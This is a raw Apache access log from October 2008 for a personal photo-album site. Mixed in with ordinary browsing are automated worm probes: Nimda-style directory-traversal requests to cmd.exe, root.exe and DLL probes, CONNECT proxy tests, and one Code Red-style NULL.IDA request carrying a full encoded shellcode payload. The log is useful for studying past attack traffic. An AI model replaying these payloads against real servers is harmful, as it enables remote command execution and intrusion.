24.55.169.162 - - [22/Oct/2008:21:30:19 -0500] "GET /~user/pics/Brooke/DSC00708.JPG HTTP/1.1" 200 67310 "http://website.com/~user/pics/Brooke/" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)"
24.55.169.162 - - [22/Oct/2008:21:30:26 -0500] "GET /~user/pics/TiffsParty/ HTTP/1.1" 200 2800 "http://website.com/~user/pics/" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)"
24.55.169.162 - - [22/Oct/2008:21:30:27 -0500] "GET /~user/pics/TiffsParty/DSC00673.JPG HTTP/1.1" 200 74512 "http://website.com/~user/pics/TiffsParty/" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)"
24.55.169.162 - - [22/Oct/2008:21:30:33 -0500] "GET /~user/pics/TiffsParty/DSC00668.JPG HTTP/1.1" 200 44639 "http://website.com/~user/pics/TiffsParty/" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)"
24.55.169.162 - - [22/Oct/2008:21:30:41 -0500] "GET /~user/pics/person2/ HTTP/1.1" 200 1327 "http://website.com/~user/pics/" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)"
24.55.169.162 - - [22/Oct/2008:21:30:43 -0500] "GET /~user/pics/person2/school/ HTTP/1.1" 200 1834 "http://website.com/~user/pics/person2/" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)"
24.55.169.162 - - [22/Oct/2008:21:30:44 -0500] "GET /~user/pics/person2/school/ HTTP/1.1" 200 1834 "http://website.com/~user/pics/person2/" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)"
24.55.169.162 - - [22/Oct/2008:21:30:46 -0500] "GET /~user/pics/person2/school/DSC00222.JPG HTTP/1.1" 200 108434 "http://website.com/~user/pics/person2/school/" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)"
24.55.169.162 - - [22/Oct/2008:21:30:54 -0500] "GET /~user/pics/person2/iceskating/ HTTP/1.1" 200 1844 "http://website.com/~user/pics/person2/" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)"
24.55.169.162 - - [22/Oct/2008:21:30:55 -0500] "GET /~user/pics/person2/iceskating/DSCN0079.JPG HTTP/1.1" 200 31122 "http://website.com/~user/pics/person2/iceskating/" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)"
80.141.98.120 - - [23/Oct/2008:11:39:14 -0500] "CONNECT 1.3.3.7:1337 HTTP/1.0" 405 333 "-" "-"
80.110.18.129 - - [23/Oct/2008:14:57:33 -0500] "POST /_vti_bin/_vti_aut/fp30reg.dll HTTP/1.1" 404 441 "-" "-"
24.128.34.115 - - [24/Oct/2008:16:14:37 -0500] "GET /scripts/nsiislog.dll" 404 313 "-" "-"
172.153.160.60 - - [24/Oct/2008:16:48:44 -0500] "GET /~user/pics/ HTTP/1.1" 200 2022 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; .NET CLR 1.1.4322)"
172.153.160.60 - - [24/Oct/2008:16:48:45 -0500] "GET /icons/back.gif HTTP/1.1" 200 216 "http://website.com/~user/pics/" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; .NET CLR 1.1.4322)"
172.153.160.60 - - [24/Oct/2008:16:48:45 -0500] "GET /icons/blank.gif HTTP/1.1" 200 148 "http://website.com/~user/pics/" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; .NET CLR 1.1.4322)"
172.153.160.60 - - [24/Oct/2008:16:48:45 -0500] "GET /icons/folder.gif HTTP/1.1" 200 225 "http://website.com/~user/pics/" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; .NET CLR 1.1.4322)"
172.153.160.60 - - [24/Oct/2008:16:48:49 -0500] "GET /~user HTTP/1.1" 301 329 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; .NET CLR 1.1.4322)"
172.153.160.60 - - [24/Oct/2008:16:48:49 -0500] "GET /~user/ HTTP/1.1" 200 1496 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; .NET CLR 1.1.4322)"
172.153.160.60 - - [24/Oct/2008:16:48:50 -0500] "GET /icons/p.gif HTTP/1.1" 200 237 "http://website.com/~user/" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; .NET CLR 1.1.4322)"
172.153.160.60 - - [24/Oct/2008:16:48:54 -0500] "GET / HTTP/1.1" 200 1456 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; .NET CLR 1.1.4322)"
172.153.160.60 - - [24/Oct/2008:16:48:55 -0500] "GET /apache_pb.gif HTTP/1.1" 200 2326 "http://website.com/" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; .NET CLR 1.1.4322)"
66.191.253.204 - - [24/Oct/2008:18:37:42 -0500] "GET /scripts/root.exe?/c+dir HTTP/1.0" 404 309 "-" "-"
66.191.253.204 - - [24/Oct/2008:18:37:42 -0500] "GET /MSADC/root.exe?/c+dir HTTP/1.0" 404 307 "-" "-"
66.191.253.204 - - [24/Oct/2008:18:37:42 -0500] "GET /c/winnt/system32/cmd.exe?/c+dir HTTP/1.0" 404 317 "-" "-"
66.191.253.204 - - [24/Oct/2008:18:37:43 -0500] "GET /d/winnt/system32/cmd.exe?/c+dir HTTP/1.0" 404 317 "-" "-"
66.191.253.204 - - [24/Oct/2008:18:37:43 -0500] "GET /scripts/..%255c../winnt/system32/cmd.exe?/c+dir HTTP/1.0" 404 331 "-" "-"
66.191.253.204 - - [24/Oct/2008:18:37:43 -0500] "GET /_vti_bin/..%255c../..%255c../..%255c../winnt/system32/cmd.exe?/c+dir HTTP/1.0" 404 348 "-" "-"
66.191.253.204 - - [24/Oct/2008:18:37:43 -0500] "GET /_mem_bin/..%255c../..%255c../..%255c../winnt/system32/cmd.exe?/c+dir HTTP/1.0" 404 348 "-" "-"
66.191.253.204 - - [24/Oct/2008:18:37:43 -0500] "GET /msadc/..%255c../..%255c../..%255c/..%c1%1c../..%c1%1c../..%c1%1c../winnt/system32/cmd.exe?/c+dir HTTP/1.0" 404 364 "-" "-"
66.191.253.204 - - [24/Oct/2008:18:37:44 -0500] "GET /scripts/..%c1%1c../winnt/system32/cmd.exe?/c+dir HTTP/1.0" 404 330 "-" "-"
66.191.253.204 - - [24/Oct/2008:18:37:44 -0500] "GET /scripts/..%c0%2f../winnt/system32/cmd.exe?/c+dir HTTP/1.0" 404 330 "-" "-"
66.191.253.204 - - [24/Oct/2008:18:37:44 -0500] "GET /scripts/..%c0%af../winnt/system32/cmd.exe?/c+dir HTTP/1.0" 404 330 "-" "-"
66.191.253.204 - - [24/Oct/2008:18:37:47 -0500] "GET /scripts/..%c1%9c../winnt/system32/cmd.exe?/c+dir HTTP/1.0" 404 330 "-" "-"
66.191.253.204 - - [24/Oct/2008:18:37:47 -0500] "GET /scripts/..%%35%63../winnt/system32/cmd.exe?/c+dir HTTP/1.0" 400 321 "-" "-"
66.191.253.204 - - [24/Oct/2008:18:37:48 -0500] "GET /scripts/..%%35c../winnt/system32/cmd.exe?/c+dir HTTP/1.0" 400 321 "-" "-"
66.191.253.204 - - [24/Oct/2008:18:37:48 -0500] "GET /scripts/..%25%35%63../winnt/system32/cmd.exe?/c+dir HTTP/1.0" 404 331 "-" "-"
66.191.253.204 - - [24/Oct/2008:18:37:48 -0500] "GET /scripts/..%252f../winnt/system32/cmd.exe?/c+dir HTTP/1.0" 404 331 "-" "-"
200.153.222.206 - - [24/Oct/2008:22:23:59 -0500] "GET /scripts/..%255c%255c../winnt/system32/cmd.exe?/c+dir HTTP/1.1" 404 334 "-" "-"
80.128.16.63 - - [25/Oct/2008:19:10:08 -0500] "GET /scripts/nsiislog.dll" 404 313 "-" "-"
210.118.26.154 - - [25/Oct/2008:23:37:21 -0500] "GET / HTTP/1.0" 200 1456 "-" "-"
61.62.132.224 - - [26/Oct/2008:02:08:36 -0500] "GET / HTTP/1.0" 200 1456 "-" "-"
61.62.132.224 - - [26/Oct/2008:02:08:37 -0500] "GET /NULL.IDA?CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC%u0aeb%ub890%udacf%u77ee%u0000%u0000%u838b%u0094%u0000%u408b%u0564%u0150%u0000%ue0ff%u9090=x&\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\xeb\t\x90\x90\x90_\xeb\b\x90\x90\x90\xe8\xf5\xff\xff\xff\x8do\xf0\x8d}-\x90\x90\x90\x8b\xf7f\xb8H\x063\xc9f\x8b\xc8\xb4\x99\xfc\xac2\xc4\xaa\xe2\xfa\x14$\xec\x9f\x99\x99e\xaaP(\xb9)\xbdk7_\xdef\x99q\x94\x9d\x99\x99q\x16\x9d\x99\x99q\xd7\x9b\x99\x99\x10\x1c\xda\x9c\x99\x99q\xc8\x9b\x99\x99q\xbd\x9a\x99\x99\x10\x1c\xde\x9c\x99\x99q'\x98\x99\x99\x10\x1c\xd6\x9c\x99\x99\x12\x1c\xde\x9c\x99\x99q\xe6\x9b\x99\x99\x10\x1c\xd2\x9c\x99\x99q\xc7\x99\x99\x99q\b\x99\x99\x99\x1aa\x99\xedy\x12\x1c\xd2\x9c\x99\x99\xc9f\x0c\x94\x9f\x99\x99\x12\x1c\xde\x9c\x99\x99\xc9f\x0c\x94\x9f\x99\x99\x12\x1c\xb6\x9c\x99\x99\xc9f\x0c\x1f\x9c\x99\x99\x12\x1c\xa2\x9c\x99\x99\xc9f\x0c\x1f\x9c\x99\x99!\x99\x99\x99\x99\xc9\x12\x1c\xd6\x9c\x99\x99\xc9f\x0c\\\x9c\x99\x99!\x99\x99\x99\x99\xc9f\x0cO\x9c\x99\x99Z\x12\x1c\xd2\x9c\x99\x99\xf3\x99\xf3\x80\x14\x1c\x9a\x98\x99\x99\xc9\x12\x1c\xd2\x9c\x99\x99\xc9f\x0c\x9a\x9f\x99\x99Z\x94\x93\xce\xf0\xf7\xf7\xed\xd8\xec\xed\xf6\xd8\xed\xed\xf8\xfa\xf2\xb9\xcf\xab\xa9\x94\x93\x94\x93\xf1\t\x99\x99\x99f\x0c&\x9c\x99\x99\x12\x1c\xb6\x9c\x99\x99q_\x99\x99\x99\x1aaf\x96\x1d/\x99\x99\x99\x1aa\x99\xed\xce\t\t\t\t\xf3\x99\x14\x1c\xa6\x9c\x99\x99\xc9\xf1\x99\x9d\x99\x99\x12\x1c\xda\x9c\x99\x99\xc9\x12\x1c\xb6\x9c\x99\x99\xc9f\x0c/\x9c\x99\x99\x1aa\x99\x96\x1d\x1b\x99\x99\x99\xf3\x99\x12\x1c\xa6\x9c\x99\x99\xc9\x12\x1c\xda\x9c\x99\x99\xc9\x12\x1c\xd2\x9c\x99\x99\xc9f\x0c\x9a\x9f\x99\x99\x1aaf\xed\xfd\t\t\t\tr\x1c\xf3\x99\xf1\x99\x9d\x99\x99\x12\x1c\xda\x9c\x99\x99\xc9\x12\x1c\xd2\x9c\x99\x99\xc9f\x0c\x91\x9f\x99\x99\x1aa\x99\xed\xa7\t\t\t\t\x1aaf\xed\xac\t\t\t\t\xaaB\xca\x14\x04\xa6\x9c\x99\x99\xca\xc9\x12\x1c\xda\x9c\x99\x99\xc9\x12\x1c\xa2\x9c\x99\x99\xc9f\x0c5\x9c\x99\x99\x1aa\x99\xed\x90\t\t\t\tp\xb2fff\xaaY\xd1Z\xaaYZ\xaaB\xca\x14\x04\xbd\x9b\x99\x99\xca\xaaB\xca\xca\xca\xc9f\x0c\v\x9c\x99\x99\x1aa\x99\xed\x92\t\t\t\t\x12\x1c\xbd\x9b\x99\x99Z!ffffZ\x99\x99\x99\x99\x12\x1c\xda\x9c\x99\x99^\x99\xdd\x99\x99\x99\xc9f\x0c\xfe\x9c\x99\x99\x12\x04\xda\x9c\x99\x99\x12\x1c\xaa\x9c\x99\x99\x10\xda\xd9\x10\xda\xa5\x12\x1c\xae\x9c\x99\x99\x10\xda\xa1!\x98\x98\x99\x99\x10\xda\xb5\xca\xca\xaaY\xc9\xc9\xc9\xd9\xc9\xd1\xc9\xc9\x14\x1c\xec\x9f\x99\x99\xc9\xaaY\xc9f\x0c\xee\x9c\x99\x99\x12\x1c\xaa\x9c\x99\x99\xc9f\x0c\x1f\x9c\x99\x99\x12\x1c\xae\x9c\x99\x99\xc9f\x0c\x1f\x9c\x99\x99\x12\x1c\xda\x9c\x99\x99\x12\x99Z\xf1\x99\x9d\x99\x99\xf3\xd9f\x0c9\x9c\x99\x99Z\xaaY\xc9\x14\x1cw\x9b\x99\x99^\x99\x95\x99\x99\x99\xc9\x14\x1c\xaa\x9c\x99\x99\xc9\x14\x1c\xb6\x9c\x99\x99\xc9f\x0c\xc5\x9c\x99\x99\xaaY\xc9\x14\x1cw\x9b\x99\x99\xc9\x14\x1c\xa2\x9c\x99\x99\xc9\x14\x1c\xae\x9c\x99\x99\xc9f\x0c\xc5\x9c\x99\x99Z\x99\x99\x99\x99\x99\x99\x99\x99\x98\x99\x99\x99\xc9\x14\x04\xb8\x9a\x99\x99^\x9a\x89\x99\x99\x99\xca\x14\x04\xdb\x9d\x99\x99\xca\xc9f\x0ce\x9c\x99\x99\x12A\x1aa\x99\xc1\xe5E\x12ZZ\x89\x99\x99\x99\xf3\x8a\x14\x1c\xf6\x9a\x99\x99\xc9f\x0c\xbd\x9f\x99\x99\x14\x1c\xf6\x9a\x99\x99\xc9f\x0c\xa9\x9f\x99\x99\x1aa\x99\xed\xbb\t\t\t\t\x12\xe9\x95\x12ge4\x1aa\x99\xed\x8a\t\t\t\t\x12\x99\xa5\x93\xedi\xa5Y\xedu\xa55\xedqZ\x12n4\x12\x99Z\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x12\x1c\xda\x9c\x99\x99\xc9\xf3\x9bf\x0c\x80\x9f\x99\x99\xf3\x99\xf3\x98\xf3\x9bf\x0cp\x9c\x99\x99\x1aaf\x96\x1d\x01\x99\x99\x99\x10\x1c\xde\x9c\x99\x99\x14\x04\xa6\x9c\x99\x99^\x9a\x98\x99\x99\x99\xf3\x9d\xca\xf3\x9d\xf1ff\x99\x99\xc9f\x0c\xa7\x9f\x99\x99\x1aa\x99\xec\xe9\t\t\t\t\xff\x12\x1c\xf6\x9f\x99\x99\xff\x10\x1c\xdd\x9d\x99\x99\x12\x1c\xe8\x9f\x99\x99\x10\x1c\xdf\x9d\x99\x99\x1aaf\xec\x96\t\t\t\tq\xb3fff\x10\x1c\xdf\x9d\x99\x99\x12\x1c\xde\x9c\x99\x99\xf3\x89\x14\x04\xdb\x9d\x99\x99\xca\xc9f\x0ci\x9c\x99\x99\x1aa\x99\xec\xba\t\t\t\t\xf3\x9c\x12\x1c\xde\x9c\x99\x99\xc9f\x0cl\x9c\x99\x99\x1aa\x99\xec\x92\t\t\t\t\x12\x1c\xde\x9c\x99\x99Z\xaaYZ\x9b\x99\x99\xfa\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99!\x99\x99h\xee\x18\xa1\xd4\xc3\t\x99\xed\x9e\t\t\t\t\xd1rh\x12A\x12\xea\xa5\x9aj\x12\xef\xe1\x9aj\x12\xe7\xb9\x9ab\x12\xd7\x8d\xaaK\xcf\xce\xc8\x12\xa6\x9ab\x14,\xc1\x9f\x99\x99\xaaP(\x9ej\xff>\xed\x95\t\t\t\t\xc0\xc6\x1a^\x9d\xdb{F\xc0\xc6\xc7\x12S\x12\xdf\xbd\x9aZHx\x9aX\xaaP\xff\x12\x91\x12\xdf\x85\x9aZXx\x9b\x9aX\x12\x99\x9aZ\x10\x1c\xf2\x9f\x99\x99\x12Z\x14\x04\xd2\x9f\x99\x99q\xc9\x99\x99\x99\x10\x1c\xfe\x9f\x99\x99Z\x14$\xca\x9c\x99\x99\x12^\xceq\xb6\x99\x99\x99\xc6\xc9\xabY\xaaPnHek7\xc1\x19\xa6\x99\xed\x8e\t\t\t\t\xc9\xce\x12Fq\x84\x99\x99\x99\xc6\x10\x9e\xc1\xde\xde\xde\xder@\xde\x19\xa6\x99\xecSZ\xca\x14\x04\xfe\x9f\x99\x99\xc9f\x8a\xc2Z\xce\x14$\xf2\x9f\x99\x99\xca\xc9f\x8e\xc6Z\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\xd2\xdc\xcb\xd7\xdc\xd5\xaa\xab\x99\xda\xeb\xfc\xf8\xed\xfc\xc9\xf0\xe9\xfc\x99\xde\xfc\xed\xca\xed\xf8\xeb\xed\xec\xe9\xd0\xf7\xff\xf6\xd8\x99\xda\xeb\xfc\xf8\xed\xfc\xc9\xeb\xf6\xfa\xfc\xea\xea\xd8\x99\xda\xf5\xf6\xea\xfc\xd1\xf8\xf7\xfd\xf5\xfc\x99\xc9\xfc\xfc\xf2\xd7\xf8\xf4\xfc\xfd\xc9\xf0\xe9\xfc\x99\xde\xf5\xf6\xfb\xf8\xf5\xd8\xf5\xf5\xf6\xfa\x99\xce\xeb\xf0\xed\xfc\xdf\xf0\xf5\xfc\x99\xcb\xfc\xf8\xfd\xdf\xf0\xf5\xfc\x99\xca\xf5\xfc\xfc\xe9\x99\xcd\xfc\xeb\xf4\xf0\xf7\xf8\xed\xfc\xc9\xeb\xf6\xfa\xfc\xea\xea\x99\xdc\xe1\xf0\xed\xcd\xf1\xeb\xfc\xf8\xfd\x99\x99\xce\xca\xab\xc6\xaa\xab\x99\xea\xf6\xfa\xf2\xfc\xed\x99\xfb\xf0\xf7\xfd\x99\xf5\xf0\xea\xed\xfc\xf7\x99\xf8\xfa\xfa\xfc\xe9\xed\x99\xea\xfc\xf7\xfd\x99\xeb\xfc\xfa\xef\x99\xfa\xf5\xf6\xea\xfc\xea\xf6\xfa\xf2\xfc\xed\x99\xce\xca\xd8\xca\xed\xf8\xeb\xed\xec\xe9\x99\xfe\xfc\xed\xf1\xf6\xea\xed\xf7\xf8\xf4\xfc\x99\xfe\xfc\xed\xf1\xf6\xea\xed\xfb\xe0\xf7\xf8\xf4\xfc\x99\xea\xfc\xed\xea\xf6\xfa\xf2\xf6\xe9\xed\x99\x99\x99\xd5\xf6\xf8\xfd\xd5\xf0\xfb\xeb\xf8\xeb\xe0\xd8\x99\xde\xfc\xed\xc9\xeb\xf6\xfa\xd8\xfd\xfd\xeb\xfc\xea\xea\x99\xea\xeb\x7f\xee\xa8\xe9\x7f\xee\x99\xfa\xdb\xdb\xbf\xd2cmd.exe$ HTTP/1.1" 404 301 "-" "-"
66.141.15.161 - - [26/Oct/2008:02:59:44 -0500] "GET /scripts/nsiislog.dll" 404 313 "-" "-"
62.178.217.245 - - [26/Oct/2008:05:53:54 -0500] "CONNECT 1.3.3.7:1337 HTTP/1.0" 405 333 "-" "-"
195.199.101.189 - - [27/Oct/2008:01:32:36 -0500] "GET /scripts/..%255c%255c../winnt/system32/cmd.exe?/c+dir" 404 334 "-" "-"
142.166.171.250 - - [27/Oct/2008:03:59:58 -0500] "CONNECT 1.3.3.7:1337 HTTP/1.0" 405 333 "-" "-"
158.42.179.11 - - [27/Oct/2008:20:01:19 -0500] "SEARCH / HTTP/1.1" 501 316 "-" "-"
64.241.177.25 - - [28/Oct/2008:19:17:01 -0500] "GET /scripts/nsiislog.dll" 404 313 "-" "-"
66.82.9.44 - - [28/Oct/2008:22:06:55 -0500] "GET /~user/pics/ HTTP/1.0" 200 2022 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; .NET CLR 1.0.3705)"
66.82.9.44 - - [28/Oct/2008:22:06:57 -0500] "GET /icons/blank.gif HTTP/1.0" 200 148 "http://website.com/~user/pics/" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; .NET CLR 1.0.3705)"
66.82.9.44 - - [28/Oct/2008:22:06:57 -0500] "GET /icons/back.gif HTTP/1.0" 200 216 "http://website.com/~user/pics/" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; .NET CLR 1.0.3705)"
66.82.9.44 - - [28/Oct/2008:22:06:57 -0500] "GET /icons/folder.gif HTTP/1.0" 200 225 "http://website.com/~user/pics/" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; .NET CLR 1.0.3705)"
66.82.9.44 - - [28/Oct/2008:22:07:09 -0500] "GET /~user/pics/AmandasParty/ HTTP/1.0" 200 1957 "http://website.com/~user/pics/" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; .NET CLR 1.0.3705)"
66.82.9.44 - - [28/Oct/2008:22:07:11 -0500] "GET /icons/image2.png HTTP/1.0" 200 355 "http://website.com/~user/pics/AmandasParty/" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; .NET CLR 1.0.3705)"
66.82.9.44 - - [28/Oct/2008:22:07:14 -0500] "GET /~user/pics/AmandasParty/DSC00693.JPG HTTP/1.0" 200 80811 "http://website.com/~user/pics/AmandasParty/" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; .NET CLR 1.0.3705)"
64.80.56.5 - - [28/Oct/2008:22:37:39 -0500] "GET /~user/pics/ HTTP/1.1" 200 2022 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)"
64.80.56.5 - - [28/Oct/2008:22:37:40 -0500] "GET /icons/blank.gif HTTP/1.1" 200 148 "http://website.com/~user/pics/" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)"
64.80.56.5 - - [28/Oct/2008:22:37:40 -0500] "GET /icons/back.gif HTTP/1.1" 200 216 "http://website.com/~user/pics/" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)"
64.80.56.5 - - [28/Oct/2008:22:37:40 -0500] "GET /icons/folder.gif HTTP/1.1" 200 225 "http://website.com/~user/pics/" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)"
64.80.56.5 - - [28/Oct/2008:22:37:45 -0500] "GET /~user/pics/person3+person4/ HTTP/1.1" 200 4131 "http://website.com/~user/pics/" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)"
64.80.56.5 - - [28/Oct/2008:22:37:46 -0500] "GET /icons/image2.png HTTP/1.1" 200 355 "http://website.com/~user/pics/person3+person4/" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)"
64.80.56.5 - - [28/Oct/2008:22:37:48 -0500] "GET /~user/pics/person3+person4/DSC00588.JPG HTTP/1.1" 200 43702 "http://website.com/~user/pics/person3+person4/" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)"
64.80.56.5 - - [28/Oct/2008:22:37:55 -0500] "GET /~user/pics/person3+person4/DSC00589.JPG HTTP/1.1" 200 50909 "http://website.com/~user/pics/person3+person4/" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)"
64.80.56.5 - - [28/Oct/2008:22:38:20 -0500] "GET /~user/pics/person3+person4/DSC00592.JPG HTTP/1.1" 200 43969 "http://website.com/~user/pics/person3+person4/" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)"
64.80.56.5 - - [28/Oct/2008:22:38:35 -0500] "GET /~user/pics/person3+person4/DSC00594.JPG HTTP/1.1" 200 35420 "http://website.com/~user/pics/person3+person4/" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)"
64.80.56.5 - - [28/Oct/2008:22:38:45 -0500] "GET /~user/pics/person3+person4/DSC00597.JPG HTTP/1.1" 200 41744 "http://website.com/~user/pics/person3+person4/" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)"
64.80.56.5 - - [28/Oct/2008:22:38:55 -0500] "GET /~user/pics/person3+person4/DSC00598.JPG HTTP/1.1" 200 49679 "http://website.com/~user/pics/person3+person4/" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)"
64.80.56.5 - - [28/Oct/2008:22:39:03 -0500] "GET /~user/pics/person3+person4/DSC00599.JPG HTTP/1.1" 200 50590 "http://website.com/~user/pics/person3+person4/" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)"
64.80.56.5 - - [28/Oct/2008:22:39:59 -0500] "GET /~user/pics/person3+person4/DSC00600.JPG HTTP/1.1" 200 46035 "http://website.com/~user/pics/person3+person4/" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)"
64.80.56.5 - - [28/Oct/2008:22:40:43 -0500] "GET /~user/pics/person3+person4/DSC00601.JPG HTTP/1.1" 200 51163 "http://website.com/~user/pics/person3+person4/" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)"
64.80.56.5 - - [28/Oct/2008:22:41:00 -0500] "GET /~user/pics/person3+person4/DSC00602.JPG HTTP/1.1" 200 48616 "http://website.com/~user/pics/person3+person4/" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)"
64.80.56.5 - - [28/Oct/2008:22:41:51 -0500] "GET /~user/pics/ HTTP/1.1" 200 2022 "http://website.com/~user/pics/person3+person4/" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)"
64.80.56.5 - - [28/Oct/2008:22:42:03 -0500] "GET /~user/pics/person2/ HTTP/1.1" 200 1327 "http://website.com/~user/pics/" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)"
64.80.56.5 - - [28/Oct/2008:22:42:06 -0500] "GET /~user/pics/person2/NiagaraFalls/ HTTP/1.1" 200 7712 "http://website.com/~user/pics/person2/" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)"
64.80.56.5 - - [28/Oct/2008:22:42:11 -0500] "GET /~user/pics/person2/NiagaraFalls/DSC00354%20(Large).JPG HTTP/1.1" 200 38217 "http://website.com/~user/pics/person2/NiagaraFalls/" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)"
64.80.56.5 - - [28/Oct/2008:22:42:19 -0500] "GET /~user/pics/person2/NiagaraFalls/DSC00355%20(Large).JPG HTTP/1.1" 200 58470 "http://website.com/~user/pics/person2/NiagaraFalls/" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)"
64.80.56.5 - - [28/Oct/2008:22:42:29 -0500] "GET /~user/pics/person2/NiagaraFalls/DSC00359%20(Large).JPG HTTP/1.1" 200 65988 "http://website.com/~user/pics/person2/NiagaraFalls/" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)"
64.80.56.5 - - [28/Oct/2008:22:43:17 -0500] "GET /~user/pics/person2/NiagaraFalls/DSC00360%20(Large).JPG HTTP/1.1" 200 60684 "http://website.com/~user/pics/person2/NiagaraFalls/" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)"
64.80.56.5 - - [28/Oct/2008:22:43:39 -0500] "GET /~user/pics/person2/NiagaraFalls/DSC00361%20(Large).JPG HTTP/1.1" 200 56578 "http://website.com/~user/pics/person2/NiagaraFalls/" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)"
